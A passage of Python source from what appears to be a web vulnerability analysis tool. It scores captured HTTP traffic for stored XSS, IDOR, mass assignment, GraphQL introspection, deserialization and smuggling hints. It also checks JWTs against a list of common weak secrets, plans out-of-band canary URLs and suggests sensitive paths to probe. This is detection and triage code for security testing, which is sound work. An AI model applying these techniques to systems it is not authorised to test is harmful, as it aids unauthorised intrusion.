            _add_reason(record, RC["W_SSTI"])
    # GraphQL
    gql = bag.get("GRAPHQL")
    if isinstance(gql, dict):
        deep_hit = False
        for v in gql.values():
            if not isinstance(v, dict):
                continue
            blob = (str(v.get("echo") or "") + " " + str(v.get("body") or "")).lower()
            if "__schema" in blob and ("querytype" in blob or "mutationtype" in blob or '"types"' in blob):
                deep_hit = True
                break
        if deep_hit:
            _add_reason(record, RC["W_GRAPHQL"])
            _add_reason(record, RC["W_GRAPHQL_DEEP"])
    # Mass assignment
    mass = bag.get("MASSASSIGN")
    if isinstance(mass, dict):
        for v in mass.values():
            if not isinstance(v, dict):
                continue
            ds = int(v.get("delta_status") or 0)
            dz = int(v.get("delta_size") or 0)
            body = str(v.get("body") or "") + " " + str(v.get("echo") or "")
            if ds >= 1 or ("\"role\"" in body and "admin" in body.lower()) or dz > 256:
                _add_reason(record, RC["W_MASSASSIGN_CONF"])
                break
    # IDOR
    idor = bag.get("IDOR")
    if isinstance(idor, dict):
        diffs = 0
        for v in idor.values():
            if not isinstance(v, dict):
                continue
            ds = abs(int(v.get("delta_status") or 0))
            dz = abs(int(v.get("delta_size") or 0))
            if ds >= 1 or dz >= 256:
                diffs += 1
        if diffs >= 1:
            _add_reason(record, RC["W_IDOR_CONF"])

# ──────────────────────────────────────────────────────────────────────────────
# OOB channels planner (advisory)

def extend_oob_channels(record: Dict[str, Any]) -> None:  # type: ignore[override]
    """
    Advisory: flag when OOB verification would be valuable for SSRF/XXE.
    """
    if not _advanced_enabled("oob_channels"):
        return
    rc = set(record.get("reason_codes") or [])
    if rc.intersection({RC["W_SSRF"], RC["W_XXE"]}):
        _add_reason(record, RC["OOB_REQUIRED"])
        plan = record.get("oob_plan") or []
        if isinstance(plan, list):
            plan.append({"family": "SSRF/XXE", "suggest": "DNS/HTTP canary", "status": "planned"})
            record["oob_plan"] = plan

# ──────────────────────────────────────────────────────────────────────────────
# DOM-reflection sink detector (refines E-REFLECT-CRIT with DOM-specific)

RC.update({
    "E_REFLECT_DOM": "E-REFLECT-DOM",
})

_DOM_SINKS = [
    r"document\.write\s*\(",
    r"innerHTML\s*=",
    r"outerHTML\s*=",
    r"location\.(hash|search)",
    r"eval\s*\(",
]

def detect_dom_sink_context(record: Dict[str, Any], reflections: List[str]) -> None:
    """
    If reflection appears near typical DOM sinks, add E-REFLECT-DOM.
    """
    body = (record.get("body_snippet") or record.get("body") or "")
    low = body.lower()
    around = low  # naive; full DOM analysis out of scope
    if any(re.search(pat, around, re.I) for pat in _DOM_SINKS) and reflections:
        _add_reason(record, RC["E_REFLECT_DOM"])

# Wire into extend_ab_evidence reflection handling
_prev_extend_ab_evidence2 = extend_ab_evidence
def extend_ab_evidence(record: Dict[str, Any], features: Optional[Dict[str, Any]] = None) -> None:  # type: ignore[override]
    _prev_extend_ab_evidence2(record, features=features)
    try:
        bag = record.get("ab_evidence") or {}
        refl = _collect_reflections(bag)
        if refl:
            detect_dom_sink_context(record, refl)
    except Exception as e:
        log.warning("detect_dom_sink_context failed: %r", e)

# ──────────────────────────────────────────────────────────────────────────────
# Update gap reporter: remove 'graphql_deep' and 'massassign_state' from missing

def report_remaining_gaps(features: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:  # type: ignore[override]
    feats = validate_features(features or {})
    missing: List[str] = []

    def off(name: str) -> bool:
        return not feats.get("features", {}).get(name, False)

    # XSS advanced — still partial (stored/DOM execution)
    missing.extend(["xss_dom", "xss_stored"])

    if off("oob_channels"):
        missing.append("ssrf_xxe_oob")
    if off("jwt_crypto"):
        missing.append("jwt_crypto")
    if off("deserialization_gadgets"):
        missing.append("deserialization_gadgets")
    # mass assignment: we have confirmation via evidence; no longer a core gap
    # idor cross-account still a gap
    if off("idor_cross_account"):
        missing.append("idor_cross")
    # baseline cross-run implemented
    # per-endpoint learning optional
    if off("baseline_per_endpoint"):
        missing.append("baseline_cross_run (per-endpoint learning)")
    # SSTI full engine still a gap
    if off("ssti"):
        missing.append("ssti_full")
    # Smuggling/poisoning advanced
    if off("smuggling"):
        missing.append("smuggling_poisoning")
    # GraphQL deep handled via introspection evidence → not a core gap now

    # De-dup and order
    seen = set(); ordered = []
    for m in missing:
        if m not in seen:
            seen.add(m); ordered.append(m)

    desc_map = {k: v for k, v in ADV_GAP_CATALOG}
    desc_map.setdefault("baseline_cross_run (per-endpoint learning)", "In-batch learning per endpoint (optional)")
    return {
        "missing": ordered,
        "descriptions": {m: desc_map.get(m, "") for m in ordered},
        "count": len(ordered),
    }

# ──────────────────────────────────────────────────────────────────────────────
# Public API update

__all__ = list(sorted(set(__all__ + [
    "_parse_jwt",
    "detect_dom_sink_context",
])))
# (continued) analysis_extend.py
# ──────────────────────────────────────────────────────────────────────────────
# In-batch Stored XSS detector (fail-soft)
# Looks for user-supplied tokens posted in earlier requests resurfacing in later responses.

RC.update({
    "E_XSS_STORED_CONF": "E-XSS-STORED-CONF",
})

_STORED_XSS_FIELDS = {"comment","message","content","text","body","bio","description","title"}

def _collect_candidate_tokens(rows: List[Dict[str, Any]], max_len: int = 64) -> List[Tuple[str, Dict[str, Any]]]:
    """
    Scan POST/PUT/PATCH requests for text-like fields; return list of (token, src_record).
    Token is a trimmed snippet, safe for search in later bodies.
    """
    cand: List[Tuple[str, Dict[str, Any]]] = []
    for r in rows or []:
        method = str(r.get("method") or r.get("meth") or "").upper()
        if method not in ("POST","PUT","PATCH"):
            continue
        params = _extract_params(r)
        if not params:
            continue
        for k, v in list(params.items()):
            kl = str(k).lower()
            if kl in _STORED_XSS_FIELDS and isinstance(v, str) and v.strip():
                tok = v.strip()
                # normalize token length
                if len(tok) > max_len:
                    tok = tok[:max_len]
                # ignore ultra-short tokens
                if len(tok) >= 5:
                    cand.append((tok, r))
    return cand

def _same_surface(a: Dict[str, Any], b: Dict[str, Any]) -> bool:
    """
    Coarse heuristic to relate POST target and a later GET page:
    - same host
    - path share first 2 segments
    """
    try:
        pa = urlparse(a.get("url") or "")
        pb = urlparse(b.get("url") or "")
        if pa.netloc != pb.netloc:
            return False
        seg_a = [s for s in (pa.path or "/").split("/") if s]
        seg_b = [s for s in (pb.path or "/").split("/") if s]
        return seg_a[:2] == seg_b[:2]
    except Exception:
        return False

def detect_stored_xss(rows: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """
    If a token posted earlier appears in later responses on same surface, mark stored XSS confirmed.
    Returns list of rows updated.
    """
    updated: List[Dict[str, Any]] = []
    if not rows:
        return updated
    # Collect candidates
    cands = _collect_candidate_tokens(rows)
    if not cands:
        return updated

    # For each later GET/HTML response, search tokens
    for idx, r in enumerate(rows):
        method = str(r.get("method") or r.get("meth") or "").upper()
        ctype = (r.get("content_type") or "").lower()
        if method != "GET" or ("html" not in ctype and "xml" not in ctype):
            continue
        body = (r.get("body_snippet") or r.get("body") or "")
        if not body:
            continue
        low = body.lower()
        for tok, src in cands:
            if not _same_surface(src, r):
                continue
            # token present verbatim or HTML-encoded
            if tok in body or html.escape(tok) in body or tok.lower() in low:
                _add_reason(r, RC["E_XSS_STORED_CONF"])
                # Strengthen confidence
                try:
                    ab = _safe_float(r.get("ab_confidence"))
                    if ab < 0.65:
                        r["ab_confidence"] = 0.65
                    extend_confidence(r, features=None)
                except Exception:
                    pass
                updated.append(r)
                break
    return updated

# ──────────────────────────────────────────────────────────────────────────────
# Deserialization heuristics (stronger hints)

RC.update({
    "W_DESERIAL_JAVA_HDR": "W-DESERIAL-JAVA-HDR",  # Java Serialized Object header seen
    "W_DESERIAL_PHP_SIG": "W-DESERIAL-PHP-SIG",    # PHP serialized signatures
})

def extend_deserialization_gadgets(record: Dict[str, Any]) -> None:  # type: ignore[override]
    """
    Heuristics:
      - Request/response suggests Java/PHP serialization usage.
      - Params look like base64 blobs or PHP serialized strings.
    """
    if not _advanced_enabled("deserialization_gadgets"):
        return
    headers = record.get("headers") or {}
    ctype = (_header_lookup(headers, "Content-Type") or record.get("content_type") or "").lower()
    body = (record.get("body_snippet") or record.get("body") or "")
    # Java serialization content-type
    if "application/x-java-serialized-object" in ctype:
        _add_reason(record, RC["W_DESERIAL_JAVA_HDR"])
    # Java serialized magic bytes 'ac ed 00 05' often show up in binary dumps → search hex-escaped
    if re.search(r"(\\xAC\\xED\\x00\\x05|\xac\xed\x00\x05)", body, re.I):
        _add_reason(record, RC["W_DESERIAL_JAVA_HDR"])
    # PHP serialized patterns: O:<len>:"Class"; or a:<len>:{...}
    if re.search(r'\b(O|a|s|i|b):\d+:"?[A-Za-z0-9_\\]+' + r'"?[:;{]', body):
        _add_reason(record, RC["W_DESERIAL_PHP_SIG"])
    # Params with long base64 may indicate serialized payload
    params = _extract_params(record)
    if any(re.fullmatch(r"[A-Za-z0-9+/=_\-\.]{40,}", str(v) or "") for v in params.values()):
        _add_reason(record, RC["DESERIAL_GADGET_HINT"])

# ──────────────────────────────────────────────────────────────────────────────
# IDOR cross-account analyzer (advisory)
# Looks for strong IDOR signals within batch; true cross-account proof needs multiple identities.

RC.update({
    "W_IDOR_STRONG": "W-IDOR-STRONG",
})

_ID_KEYS = {"id","user","user_id","uid","account","account_id","order","order_id","profile","profile_id"}

def analyze_idor_cross_account(rows: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """
    Group rows by signature; if varying ID-like params produce consistent status 200
    with substantial response size variations, mark as strong IDOR suspect.
    """
    updated = []
    groups: Dict[str, List[Dict[str, Any]]] = {}
    for r in rows or []:
        key = r.get("sig_key")
        if key:
            groups.setdefault(key, []).append(r)

    for key, lst in groups.items():
        # collect size per distinct ID-like value
        per_val: Dict[str, List[int]] = {}
        ids_seen = set()
        for r in lst:
            params = _extract_params(r)
            val = None
            for k in params.keys():
                if k.lower() in _ID_KEYS:
                    val = str(params.get(k) or "")
                    break
            if not val:
                continue
            ids_seen.add(val)
            per_val.setdefault(val, []).append(_safe_int(r.get("size")))
        if len(ids_seen) >= 2:
            # Compare median sizes across at least 2 IDs
            medians = [int(statistics.median(v)) for v in per_val.values() if v]
            if medians and (max(medians) - min(medians) > 1024):  # >1KB difference
                # mark all rows in group as strong IDOR suspect
                for r in lst:
                    _add_reason(r, RC["W_IDOR_STRONG"])
                    updated.append(r)
    return updated

# ──────────────────────────────────────────────────────────────────────────────
# Smuggling/Poisoning extra hints (header combos & proxies)

RC.update({
    "W_PROXY_CHAIN": "W-PROXY-CHAIN",
})

def extend_smuggling_poisoning(record: Dict[str, Any]) -> None:  # type: ignore[override]
    """
    Additional hints:
      - TE + CL conflict
      - Proxy chain headers present (Via, X-Forwarded-For, X-Original-URL)
      - Vary: Authorization with cache Age > 0
    """
    if not _advanced_enabled("smuggling"):
        return
    headers = record.get("headers") or {}
    te = _header_lookup(headers, "Transfer-Encoding") or ""
    cl = _header_lookup(headers, "Content-Length") or ""
    if "chunked" in te.lower() and cl:
        _add_reason(record, RC["SMUGGLE_HINT"])
    vary = _header_lookup(headers, "Vary") or ""
    age = _header_lookup(headers, "Age") or ""
    if "authorization" in vary.lower() and age.isdigit() and int(age) > 0:
        _add_reason(record, RC["SMUGGLE_HINT"])
    # Proxy chain indicators
    if any(_header_lookup(headers, h) for h in ("Via","X-Forwarded-For","X-Original-URL","X-Rewrite-URL")):
        _add_reason(record, RC["W_PROXY_CHAIN"])

# ──────────────────────────────────────────────────────────────────────────────
# Wire batch analyzers into finalize hook

_prev_finalize_report_hook = finalize_report_hook
def finalize_report_hook(rows: List[Dict[str, Any]], output: Optional[Dict[str, Any]] = None, features: Optional[Dict[str, Any]] = None, page: int = 1, per_page: int = 20) -> Dict[str, Any]:  # type: ignore[override]
    res = _prev_finalize_report_hook(rows, output=output, features=features, page=page, per_page=per_page)
    try:
        # In-batch stored XSS
        _ = detect_stored_xss(rows)
    except Exception as e:
        log.warning("detect_stored_xss failed: %r", e)
    try:
        # IDOR cross-account advisory
        _ = analyze_idor_cross_account(rows)
    except Exception as e:
        log.warning("analyze_idor_cross_account failed: %r", e)
    return res

# ──────────────────────────────────────────────────────────────────────────────
# Public API update

__all__ = list(sorted(set(__all__ + [
    "detect_stored_xss",
    "analyze_idor_cross_account",
])))
# (continued) analysis_extend.py
# ──────────────────────────────────────────────────────────────────────────────
# Seeds extractor (suggest next paths to explore), Edge/Origin details,
# Gaps ASCII renderer, Row explainer, Doctor/Preflight checks.
# All fail-soft with WARNING logs.

# Seeds: heuristics to suggest next crawl targets by frequency & sensitivity
_SEED_HINT_PATHS = ("/api", "/login", "/admin", "/callback", "/export", "/search", "/oauth", "/account", "/graph", "/file", "/upload")

def extract_next_seeds(rows: List[Dict[str, Any]], limit: int = 8) -> List[str]:
    """
    Aggregate common path prefixes and sensitive keywords to produce next seeds.
    """
    from collections import Counter
    c = Counter()
    for r in rows or []:
        url = r.get("url") or ""
        try:
            p = urlparse(url).path or "/"
            # keep first two segments as a seed prefix
            seg = [s for s in p.split("/") if s]
            if seg:
                prefix = "/" + "/".join(seg[:2])
                c[prefix] += 1
            # add explicit hints if matched
            low = p.lower()
            for h in _SEED_HINT_PATHS:
                if h in low:
                    c[h] += 2
        except Exception:
            continue
    seeds = [s for s, _n in c.most_common(limit)]
    return seeds[:limit]


def render_seeds(seeds: List[str]) -> str:
    if not seeds:
        return ""
    return "Notes      Seeds to explore next: " + "  ".join(seeds) + "\n"


# ──────────────────────────────────────────────────────────────────────────────
# Edge/Origin details: add TTL brackets into CONTEXT line as text helper

def context_line_details(r: Dict[str, Any]) -> str:
    psi = f"PSI={_safe_float(r.get('psi_score')):.2f} hits={{{','.join(r.get('psi_hits') or [])}}}"
    edge = "TRUE" if r.get("edge") is True else "FALSE" if r.get("edge") is False else "UNKNOWN"
    waf = str(r.get("waf_source") or "none").capitalize()
    ttl = r.get("dns_ttl")
    ttl_part = f"  TTL={ttl}s" if ttl is not None else ""
    return f"{psi}  Edge={edge}  WAF={waf}{ttl_part}"


# Integrate context_line_details into attackable card renderer (without breaking external renderer)

_prev_render_attackable_paths = render_attackable_paths
def render_attackable_paths(cards: List[Dict[str, Any]]) -> str:  # type: ignore[override]
    base = _prev_render_attackable_paths(cards)
    # If base already printed CONTEXT lines, leave. Else, try to append in-place.
    try:
        if "CONTEXT" in base:
            return base
        # naive enhancement: append a CONTEXT line under each card block if possible
        lines = base.splitlines()
        out = []
        idx = 0
        card_i = 0
        for ln in lines:
            out.append(ln)
            if ln.strip().startswith("REASONS"):
                # look ahead for URL in current card
                try:
                    card = cards[card_i] if card_i < len(cards) else {}
                    ctx = context_line_details(card)
                    out.append(f"   CONTEXT    : {ctx}")
                    card_i += 1
                except Exception:
                    pass
            idx += 1
        return "\n".join(out) + ("\n" if not out or not out[-1].endswith("\n") else "")
    except Exception as e:
        log.warning("render_attackable_paths context enhancement failed: %r", e)
        return base


# ──────────────────────────────────────────────────────────────────────────────
# ASCII renderer for gaps & features

def render_gap_report(features: Optional[Dict[str, Any]] = None) -> str:
    rep = report_remaining_gaps(features or {})
    missing = rep.get("missing") or []
    desc = rep.get("descriptions") or {}
    lines = []
    lines.append("════════════════════════════════ CAPABILITY GAPS (advisory) ═══════════════════════════════")
    if not missing:
        lines.append("All advanced capabilities satisfied or stubbed.")
    else:
        for m in missing:
            lines.append(f"- {m}: {desc.get(m,'')}")
    return "\n".join(lines) + "\n"


# ──────────────────────────────────────────────────────────────────────────────
# Row explainer (one-liner + verbose)

def explain_row_brief(r: Dict[str, Any]) -> str:
    return f"{r.get('method','GET')} {r.get('url','-')} | CONF={r.get('confidence','-')} PSI={_safe_float(r.get('psi_score')):.2f} AB={_safe_float(r.get('ab_confidence')):.2f} REASONS={' '.join(r.get('reason_codes') or [])}"

def explain_row_verbose(r: Dict[str, Any]) -> str:
    fields = [
        ("URL", r.get("url")),
        ("METHOD", r.get("method") or r.get("meth")),
        ("STATUS", r.get("status")),
        ("SIZE", r.get("size")),
        ("CONTENT-TYPE", r.get("content_type")),
        ("PSI", f"{_safe_float(r.get('psi_score')):.2f} hits={r.get('psi_hits')}"),
        ("SIGNATURE", f"{r.get('sig_path')}?{r.get('sig_params')} → {r.get('sig_key')}"),
        ("FAMILY", f"{r.get('family')} ({r.get('family_source')} ai={r.get('family_ai_score')})"),
        ("EVIDENCE", f"{'YES' if r.get('ab_evidence') else 'NO'} ab={_safe_float(r.get('ab_confidence')):.2f}"),
        ("CONFIDENCE", r.get("confidence")),
        ("EDGE/WAF", f"edge={r.get('edge')} waf={r.get('waf_source')} ttl={r.get('dns_ttl')}s"),
        ("COOKIE_AUDIT", r.get("cookie_audit")),
        ("REASONS", r.get("reason_codes")),
    ]
    return "\n".join([f"{k:<12}: {v}" for k, v in fields])


# ──────────────────────────────────────────────────────────────────────────────
# Doctor / Preflight: check presence of optional modules and feature compatibility

def doctor_preflight(features: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    feats = validate_features(features or {})
    checks = []
    def _ok(name: str, cond: bool, msg: str) -> None:
        checks.append({"name": name, "ok": bool(cond), "note": msg})
    # Core modules
    _ok("policy", policy is not None, "policy module import")
    _ok("ingest_normalize", ingest_normalize is not None, "ingest_normalize import")
    _ok("analysis_bypass", analysis_bypass is not None, "analysis_bypass import")
    _ok("observability", observability is not None, "observability import")
    # Core functions
    _ok("param_sensitivity_index", hasattr(policy, "param_sensitivity_index"), "PSI function")
    _ok("canonical_signature", hasattr(ingest_normalize, "canonical_signature"), "Signature function")
    _ok("classify_error", hasattr(analysis_bypass, "classify_error"), "Error classification")
    _ok("extract_header_facts", hasattr(analysis_bypass, "extract_header_facts"), "Header facts")
    _ok("ab_compare", hasattr(analysis_bypass, "ab_compare"), "A/B comparison")
    _ok("robust_latency_stats", hasattr(observability, "robust_latency_stats"), "Latency robust stats")
    # Feature flags surfaces
    for fname in ("psi","signature","error_facts","ab_evidence","confidence","edge_origin","cookie_cache_audit","quality_gate","family_sources"):
        _ok(f"feature:{fname}", feats["features"].get(fname, False), "flag ON")
    # Advisory: local vector store & AI adapter
    ai_ok = hasattr(vector_store, "semantic_family_vote")
    _ok("vector_store.semantic_family_vote", ai_ok, "AI fallback vote")
    return {"checks": checks, "passed": all(x["ok"] for x in checks if not x["name"].startswith("feature:"))}

def render_doctor_preflight(rep: Dict[str, Any]) -> str:
    lines = []
    lines.append("════════════════════════════════ DOCTOR / PREFLIGHT ═══════════════════════════════════════")
    for c in rep.get("checks", []):
        status = "OK " if c["ok"] else "FAIL"
        lines.append(f"{status:<4} {c['name']:<36} {c['note']}")
    lines.append(f"\nOverall: {'PASSED' if rep.get('passed') else 'NEEDS ATTENTION'}")
    return "\n".join(lines) + "\n"


# ──────────────────────────────────────────────────────────────────────────────
# Glue: add Seeds + Doctor + Gaps into full report near Quality Gate

_prev_render_full_ascii_report2 = render_full_ascii_report
def render_full_ascii_report(rows: List[Dict[str, Any]], sections: Optional[Dict[str, Any]] = None, page: int = 1, per_page: int = 20) -> str:  # type: ignore[override]
    base = _prev_render_full_ascii_report2(rows, sections=sections, page=page, per_page=per_page)
    try:
        seeds = extract_next_seeds(rows)
        seeds_txt = render_seeds(seeds)
        # Insert seeds line inside QUALITY GATE block if possible
        return base.replace("Latency", seeds_txt + "Latency", 1)
    except Exception as e:
        log.warning("insert seeds failed: %r", e)
        return base

def render_full_ascii_report_with_extras(rows: List[Dict[str, Any]], sections: Optional[Dict[str, Any]] = None, features: Optional[Dict[str, Any]] = None, page: int = 1, per_page: int = 20) -> str:
    rpt = render_full_ascii_report(rows, sections=sections, page=page, per_page=per_page)
    # Append Doctor and Gaps at the end (advisory)
    try:
        rep = doctor_preflight(features or {})
        rpt += "\n" + render_doctor_preflight(rep)
    except Exception as e:
        log.warning("doctor preflight render failed: %r", e)
    try:
        rpt += "\n" + render_gap_report(features or {})
    except Exception as e:
        log.warning("gap report render failed: %r", e)
    return rpt


# ──────────────────────────────────────────────────────────────────────────────
# Final public API additions

__all__ = list(sorted(set(__all__ + [
    "extract_next_seeds",
    "render_seeds",
    "context_line_details",
    "render_gap_report",
    "explain_row_brief",
    "explain_row_verbose",
    "doctor_preflight",
    "render_doctor_preflight",
    "render_full_ascii_report_with_extras",
])))

# (continued) analysis_extend.py
# ──────────────────────────────────────────────────────────────────────────────
# JWT HS256 verification (optional, local-only) + weak-secret detection
# Uses secrets from config: features.jwt_hs_secrets = ["secret", "..."] or {"kid1":"secret1",...}

import hmac
import hashlib

RC.update({
    "W_JWT_WEAK_SECRET": "W-JWT-WEAK-SECRET",
    "I_JWT_VALID_HS256": "I-JWT-VALID-HS256",   # informational, token verified with provided secret
})

def _hmac_sha256(data: bytes, key: bytes) -> bytes:
    return hmac.new(key, data, hashlib.sha256).digest()

def _b64url_nopad(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).decode("ascii").rstrip("=")

def _jwt_raw_segments(token: str) -> Optional[Tuple[str, str, str]]:
    parts = token.strip().split(".")
    if len(parts) != 3:
        return None
    return parts[0], parts[1], parts[2]

def _get_hs_secrets_from_features(features: Optional[Dict[str, Any]]) -> List[Tuple[Optional[str], str]]:
    feats = features or _CURRENT_FEATURES or {}
    hs = []
    src = (feats.get("jwt_hs_secrets") or feats.get("features", {}).get("jwt_hs_secrets"))
    if isinstance(src, dict):
        for kid, sec in src.items():
            if isinstance(sec, str) and sec:
                hs.append((str(kid), sec))
    elif isinstance(src, list):
        for sec in src:
            if isinstance(sec, str) and sec:
                hs.append((None, sec))
    elif isinstance(src, str) and src:
        hs.append((None, src))
    # add common weak defaults (will be used only if not provided explicitly)
    if not hs:
        hs = [(None, s) for s in ("secret", "password", "changeme", "jwtsecret", "default")]
    return hs

def verify_jwt_hs256(record: Dict[str, Any], features: Optional[Dict[str, Any]] = None) -> None:
    """
    If Authorization: Bearer <jwt> present and header.alg == HS256, try to verify with configured secrets.
    - If verified with any provided or common weak secret → add W-JWT-WEAK-SECRET.
    - If verified with provided (non-default) secret → add I-JWT-VALID-HS256 (informational).
    Fail-soft; no crypto exceptions surfaced.
    """
    headers = record.get("headers") or {}
    authz = _header_lookup(headers, "Authorization") or ""
    if "bearer " not in authz.lower():
        return
    token = authz.split()[-1].strip()
    segs = _jwt_raw_segments(token)
    if not segs:
        return
    h_b64, p_b64, s_b64 = segs
    hdr, _pl = _parse_jwt(token)
    if not hdr or str(hdr.get("alg") or "").upper() != "HS256":
        return

    msg = f"{h_b64}.{p_b64}".encode("ascii", errors="ignore")
    provided = _get_hs_secrets_from_features(features)
    verified_with: Optional[str] = None
    used_kid = str(hdr.get("kid") or "")

    for kid, sec in provided:
        try:
            sig = _b64url_nopad(_hmac_sha256(msg, sec.encode("utf-8")))
            if hmac.compare_digest(sig, s_b64):
                verified_with = sec
                # If kid is present and a map was provided, ensure kid match if available
                if kid and used_kid and kid != used_kid:
                    continue
                break
        except Exception:
            continue

    if verified_with:
        # Weak if verified_with in our default list
        if verified_with in {"secret", "password", "changeme", "jwtsecret", "default"}:
            _add_reason(record, RC["W_JWT_WEAK_SECRET"])
        else:
            _add_reason(record, RC["I_JWT_VALID_HS256"])

# Integrate JWT HS256 verification into enrichment
_prev_enrich_record3 = enrich_record
def enrich_record(record: Dict[str, Any], kb: Optional[Dict[str, Any]] = None, features: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:  # type: ignore[override]
    rec = _prev_enrich_record3(record, kb=kb, features=features)
    try:
        verify_jwt_hs256(rec, features=features)
        # Recompute confidence (headers-related facts might increase signal slightly)
        extend_confidence(rec, features=features)
    except Exception as e:
        log.warning("verify_jwt_hs256 failed: %r", e)
    return rec


# ──────────────────────────────────────────────────────────────────────────────
# OOB Canary planner (advisory + actionable if user configures base domain)

RC.update({
    "I_OOB_PLAN": "I-OOB-PLAN",
})

def _oob_base(features: Optional[Dict[str, Any]]) -> Optional[str]:
    feats = features or _CURRENT_FEATURES or {}
    oob = feats.get("oob") or feats.get("features", {}).get("oob")
    if isinstance(oob, dict):
        return oob.get("base_domain") or oob.get("base_url")
    if isinstance(oob, str):
        return oob
    return None

def plan_oob_canary(record: Dict[str, Any], features: Optional[Dict[str, Any]] = None) -> None:
    """
    If SSRF/XXE suspected and user provided oob.base_domain, generate a deterministic canary URL:
      http(s)://<token>.<base_domain>/x/<hash>
    Attach to record['oob_plan'] and add I-OOB-PLAN reason.
    """
    rc = set(record.get("reason_codes") or [])
    if rc.isdisjoint({RC["W_SSRF"], RC["W_XXE"]}):
        return
    base = _oob_base(features)
    if not base:
        return
    # Build token from url+time (truncate)
    raw = (record.get("url") or "") + "|" + str(int(time.time()))
    token = hashlib.sha1(raw.encode("utf-8")).hexdigest()[:10]
    scheme = "https" if base.startswith("https://") else "http"
    dom = base.replace("https://", "").replace("http://", "").strip("/")
    canary = f"{scheme}://{token}.{dom}/x/{token}"
    plan = record.get("oob_plan") or []
    if isinstance(plan, list):
        plan.append({"family": "SSRF/XXE", "canary": canary, "status": "planned"})
        record["oob_plan"] = plan
        _add_reason(record, RC["I_OOB_PLAN"])

# Wire OOB planner post enrichment
_prev_enrich_record4 = enrich_record
def enrich_record(record: Dict[str, Any], kb: Optional[Dict[str, Any]] = None, features: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:  # type: ignore[override]
    rec = _prev_enrich_record4(record, kb=kb, features=features)
    try:
        plan_oob_canary(rec, features=features)
    except Exception as e:
        log.warning("plan_oob_canary failed: %r", e)
    return rec

def render_oob_plan(rows: List[Dict[str, Any]]) -> str:
    items = []
    for r in rows or []:
        for p in (r.get("oob_plan") or []):
            if isinstance(p, dict):
                items.append((r.get("url"), p.get("family"), p.get("canary")))
    if not items:
        return ""
    lines = []
    lines.append("════════════════════════════════ OOB PLAN (SSRF/XXE) ═════════════════════════════════════")
    lines.append("URL                                           FAMILY      CANARY")
    lines.append("------------------------------------------------------------------------------------------------")
    for url, fam, can in items[:12]:
        lines.append(f"{(url or '-')[:45]:<45} {(str(fam) or '-')[:10]:<10} {can or '-'}")
    return "\n".join(lines) + "\n"

# Append OOB PLAN to full report with extras
_prev_render_full_ascii_report_with_extras = render_full_ascii_report_with_extras
def render_full_ascii_report_with_extras(rows: List[Dict[str, Any]], sections: Optional[Dict[str, Any]] = None, features: Optional[Dict[str, Any]] = None, page: int = 1, per_page: int = 20) -> str:  # type: ignore[override]
    rpt = _prev_render_full_ascii_report_with_extras(rows, sections=sections, features=features, page=page, per_page=per_page)
    try:
        rpt += "\n" + render_oob_plan(rows)
    except Exception as e:
        log.warning("render_oob_plan failed: %r", e)
    return rpt


# ──────────────────────────────────────────────────────────────────────────────
# Update gap reporter in light of HS256/JWT and OOB planner

def report_remaining_gaps(features: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:  # type: ignore[override]
    feats = validate_features(features or {})
    missing: List[str] = []

    def off(name: str) -> bool:
        return not feats.get("features", {}).get(name, False)

    # XSS advanced — still partial (stored/DOM execution engine)
    missing.extend(["xss_dom", "xss_stored"])

    # OOB planner exists; but without external channel we still mark as gap only if oob not configured
    if off("oob_channels") and not _oob_base(feats):
        missing.append("ssrf_xxe_oob")

    # JWT crypto: HS256 check implemented; RS* verification still missing → keep as partial gap
    if off("jwt_crypto"):
        missing.append("jwt_crypto (RS/JWKS verify)")

    if off("deserialization_gadgets"):
        missing.append("deserialization_gadgets")
    if off("idor_cross_account"):
        missing.append("idor_cross")
    if off("baseline_per_endpoint"):
        missing.append("baseline_cross_run (per-endpoint learning)")
    if off("ssti"):
        missing.append("ssti_full")
    if off("smuggling"):
        missing.append("smuggling_poisoning")

    # Deduplicate
    seen = set(); ordered = []
    for m in missing:
        if m not in seen:
            seen.add(m); ordered.append(m)

    desc_map = {k: v for k, v in ADV_GAP_CATALOG}
    desc_map.setdefault("jwt_crypto (RS/JWKS verify)", "RSA/ECDSA signature verify via JWKS (not implemented)")
    desc_map.setdefault("baseline_cross_run (per-endpoint learning)", "In-batch learning per endpoint (optional)")
    return {
        "missing": ordered,
        "descriptions": {m: desc_map.get(m, "") for m in ordered},
        "count": len(ordered),
    }

# ──────────────────────────────────────────────────────────────────────────────
# Public API update

__all__ = list(sorted(set(__all__ + [
    "verify_jwt_hs256",
    "plan_oob_canary",
    "render_oob_plan",
])))

# (continued) analysis_extend.py
# ──────────────────────────────────────────────────────────────────────────────
# Optional: SecureBERT adapter as an AI fallback for family classification
# If available, this complements vector_store.semantic_family_vote

def _securebert_vote(text_ctx: str) -> Optional[Tuple[str, float]]:
    """
    Return (family, score) from securebert_adapter.semantic_vote(text_ctx) if present.
    """
    try:
        if securebert_adapter and hasattr(securebert_adapter, "semantic_vote"):
            res = securebert_adapter.semantic_vote(text_ctx)  # type: ignore
            if isinstance(res, dict) and res.get("family"):
                fam = str(res["family"])
                sc = float(res.get("score") or 0.0)
                return fam, sc
    except Exception as e:
        log.warning("securebert_adapter.semantic_vote failed: %r", e)
    return None

_prev_extend_family_context = extend_family_context
def extend_family_context(record: Dict[str, Any], kb: Dict[str, Any]) -> None:  # type: ignore[override]
    """
    Prefer KB; if KB unknown and AI fallback enabled:
      1) securebert_adapter.semantic_vote (if available)
      2) vector_store.semantic_family_vote (existing)
    """
    # Run original path (KB + vector fallback)
    _prev_extend_family_context(record, kb)
    if record.get("family"):
        return

    # Try securebert as an earlier AI fallback if still unknown
    text_ctx = _family_text_context(record)
    sb = _securebert_vote(text_ctx)
    if sb:
        fam, score = sb
        if fam and float(score) >= 0.5:
            mark_family_source_ai(record, fam, float(score))
            return
    # Else keep result as set by original function (may be None)

# ──────────────────────────────────────────────────────────────────────────────
# Config loader (fail-soft): merge with runtime features

def load_config_any(path: str) -> Dict[str, Any]:
    """
    Load JSON or YAML config; return dict (empty on failure).
    """
    try:
        from pathlib import Path
        txt = Path(path).read_text(encoding="utf-8")
        if not txt.strip():
            return {}
        if txt.lstrip().startswith("{"):
            return json.loads(txt)
        try:
            import yaml  # type: ignore
